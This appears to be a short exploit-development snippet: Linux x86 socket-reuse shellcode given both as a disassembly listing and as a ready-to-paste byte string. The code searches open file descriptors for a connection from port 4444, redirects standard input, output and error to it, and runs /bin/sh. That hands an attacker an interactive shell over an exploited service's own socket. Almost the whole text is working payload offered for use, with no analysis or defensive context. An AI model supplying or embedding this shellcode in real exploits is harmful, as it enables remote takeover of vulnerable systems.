 Reuse Socket Shellcode 
================================================================================

A simple socket reuse for linux system. Three system calls, socket, dup2 and execve


0:  31 db                   xor    ebx,ebx
2:  53                      push   ebx
3:  89 e7                   mov    edi,esp
5:  6a 10                   push   0x10
7:  54                      push   esp
8:  57                      push   edi
9:  53                      push   ebx
a:  89 e1                   mov    ecx,esp
c:  b3 07                   mov    bl,0x7
e:  ff 01                   inc    DWORD PTR [ecx]
10: 6a 66                   push   0x66
12: 58                      pop    eax
13: cd 80                   int    0x80
15: 66 81 7f 02 11 5c       cmp    WORD PTR [edi+0x2],0x5c11
1b: 75 f1                   jne    0xe
1d: 5b                      pop    ebx
1e: 6a 02                   push   0x2
20: 59                      pop    ecx
21: b0 3f                   mov    al,0x3f
23: cd 80                   int    0x80
25: 49                      dec    ecx
26: 79 f9                   jns    0x21
28: 50                      push   eax
29: 68 2f 2f 73 68          push   0x68732f2f
2e: 68 2f 62 69 6e          push   0x6e69622f
33: 89 e3                   mov    ebx,esp
35: 50                      push   eax
36: 53                      push   ebx
37: 89 e1                   mov    ecx,esp
39: 99                      cdq
3a: b0 0b                   mov    al,0xb
3c: cd 80                   int    0x80




shellcode_socket_reuse = (
"\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff"
"\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x11\x5c\x75\xf1\x5b"
"\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"
"\xcd\x80")



